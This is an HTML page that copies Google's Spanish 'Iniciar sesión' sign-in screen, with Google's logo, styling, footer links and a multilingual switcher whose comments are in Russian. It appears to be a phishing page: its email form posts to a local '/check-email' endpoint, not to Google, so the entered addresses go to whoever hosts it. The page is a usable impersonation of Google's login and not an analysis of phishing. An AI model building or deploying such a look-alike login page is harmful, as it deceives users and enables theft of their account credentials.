<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title data-translate="title">Iniciar sesión - Cuenta de Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
        }
        
        body {
            font-size: 14px;
            color: #202124;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            padding: 20px 30px;
            text-align: right;
            border-bottom: none;
        }
        
        .header-links {
            display: flex;
            justify-content: flex-end;
            gap: 24px;
        }
        
        .header-link {
            color: #5f6368;
            text-decoration: none;
            font-size: 13px;
            line-height: 24px;
        }
        
        .header-link:hover {
            text-decoration: underline;
        }
        
        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 40px;
        }
        
        .logo {
            margin-bottom: 20px;
        }
        
        .logo img {
            width: 75px;
            height: 24px;
        }
        
        .form-container {
            width: 100%;
            max-width: 448px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            margin: 0 auto;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            text-align: center;
            color: #202124;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 0.1px;
            line-height: 1.5;
            text-align: center;
            color: #5f6368;
            margin-bottom: 36px;
        }
        
        .input-container {
            margin-bottom: 24px;
        }
        
        .google-input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            line-height: 24px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background: #fff;
            transition: border-color 0.2s;
        }
        
        .google-input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        
        .google-input:hover {
            border-color: #8ab4f8;
        }
        
        .forgot-link {
            display: block;
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 48px;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .info-text {
            color: #5f6368;
            font-size: 14px;
            line-height: 1.4286;
            margin-bottom: 32px;
        }
        
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        
        .info-text a:hover {
            text-decoration: underline;
        }
        
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            padding: 10px 8px;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .create-account:hover {
            background: #f6fafe;
        }
        
        .next-button {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            min-width: 88px;
        }
        
        .next-button:hover {
            background: #0d62d9;
            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
        }
        
        .footer {
            margin-top: 24px;
            color: #5f6368;
            font-size: 12px;
            text-align: center;
            padding: 24px 0;
        }
        
        .language-selector {
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .language-selector select {
            padding: 8px 32px 8px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 13px;
            color: #5f6368;
            background: #fff url("data:image/svg+xml,%3Csvg fill='%235f6368' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3C/svg%3E") no-repeat right 8px center;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            cursor: pointer;
        }
        
        .footer-links {
            margin-top: 12px;
            display: flex;
            justify-content: center;
            gap: 24px;
        }
        
        .footer-link {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-link:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .form-container {
                border: none;
                padding: 24px;
                max-width: 100%;
            }
            
            .header {
                padding: 16px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="header">
        <div class="header-links">
            <a href="https://accounts.google.com/signup" class="header-link" target="_blank" data-translate="create_account">Crear cuenta</a>
            <a href="https://mail.google.com" class="header-link" target="_blank">Gmail</a>
            <a href="https://www.google.com/imghp" class="header-link" target="_blank">Imágenes</a>
        </div>
    </div>
    
    <div class="main-container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
        </div>
        
        <div class="form-container">
            <h1 class="title" data-translate="sign_in">Iniciar sesión</h1>
            <p class="subtitle" data-translate="use_account">Utiliza tu cuenta de Google</p>
            
            <form action="/check-email" method="post">
                <div class="input-container">
                    <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus data-translate-placeholder="email_placeholder">
                </div>
                
                <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank" data-translate="forgot_email">¿Has olvidado tu correo electrónico?</a>
                
                <div class="info-text">
                    <span data-translate="guest_mode">¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.</span>
                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" data-translate="learn_more">Más información</a>
                </div>
                
                <div class="button-group">
                    <a href="https://accounts.google.com/signup" class="create-account" target="_blank" data-translate="create_account">Crear cuenta</a>
                    <button type="submit" class="next-button" data-translate="next">Siguiente</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div class="language-selector">
                <select id="languageSelect">
                    <option value="es">Español (España)</option>
                    <option value="en">English (United States)</option>
                    <option value="fr">Français</option>
                    <option value="de">Deutsch</option>
                    <option value="pt">Português</option>
                    <option value="it">Italiano</option>
                </select>
            </div>
            <div class="footer-links">
                <a href="https://support.google.com/accounts" class="footer-link" target="_blank" data-translate="help">Ayuda</a>
                <a href="https://policies.google.com/privacy" class="footer-link" target="_blank" data-translate="privacy">Privacidad</a>
                <a href="https://policies.google.com/terms" class="footer-link" target="_blank" data-translate="terms">Condiciones</a>
            </div>
        </div>
    </div>

    <script>
        // Переводы для разных языков
        const translations = {
            'es': {
                'title': 'Iniciar sesión - Cuenta de Google',
                'sign_in': 'Iniciar sesión',
                'use_account': 'Utiliza tu cuenta de Google',
                'email_placeholder': 'Correo electrónico o teléfono',
                'forgot_email': '¿Has olvidado tu correo electrónico?',
                'guest_mode': '¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.',
                'learn_more': 'Más información',
                'create_account': 'Crear cuenta',
                'next': 'Siguiente',
                'help': 'Ayuda',
                'privacy': 'Privacidad',
                'terms': 'Condiciones'
            },
            'en': {
                'title': 'Sign in - Google Account',
                'sign_in': 'Sign in',
                'use_account': 'Use your Google Account',
                'email_placeholder': 'Email or phone',
                'forgot_email': 'Forgot email?',
                'guest_mode': 'Not your computer? Use Guest mode to sign in privately.',
                'learn_more': 'Learn more',
                'create_account': 'Create account',
                'next': 'Next',
                'help': 'Help',
                'privacy': 'Privacy',
                'terms': 'Terms'
            },
            'fr': {
                'title': 'Se connecter - Compte Google',
                'sign_in': 'Se connecter',
                'use_account': 'Utilisez votre compte Google',
                'email_placeholder': 'Adresse e-mail ou numéro de téléphone',
                'forgot_email': 'Adresse e-mail oubliée ?',
                'guest_mode': "Ce n'est pas votre ordinateur ? Utilisez le mode invité pour vous connecter en privé.",
                'learn_more': 'En savoir plus',
                'create_account': 'Créer un compte',
                'next': 'Suivant',
                'help': 'Aide',
                'privacy': 'Confidentialité',
                'terms': 'Conditions'
            }
        };

        // Функция для изменения языка
        function changeLanguage(lang) {
            const langData = translations[lang] || translations['es'];
            
            // Обновляем все элементы с data-translate
            document.querySelectorAll('[data-translate]').forEach(element => {
                const key = element.getAttribute('data-translate');
                if (langData[key]) {
                    element.textContent = langData[key];
                }
            });
            
            // Обновляем placeholder
            document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
                const key = element.getAttribute('data-translate-placeholder');
                if (langData[key]) {
                    element.placeholder = langData[key];
                }
            });
            
            // Обновляем title страницы
            document.title = langData['title'];
        }

        // Инициализация при загрузке
        document.addEventListener('DOMContentLoaded', function() {
            const languageSelect = document.getElementById('languageSelect');
            
            // Восстанавливаем выбранный язык из localStorage или используем испанский по умолчанию
            const savedLang = localStorage.getItem('selectedLanguage') || 'es';
            languageSelect.value = savedLang;
            changeLanguage(savedLang);
            
            // Обработчик изменения языка
            languageSelect.addEventListener('change', function() {
                const selectedLang = this.value;
                localStorage.setItem('selectedLanguage', selectedLang);
                changeLanguage(selectedLang);
            });
        });
    </script>
</body>
</html>
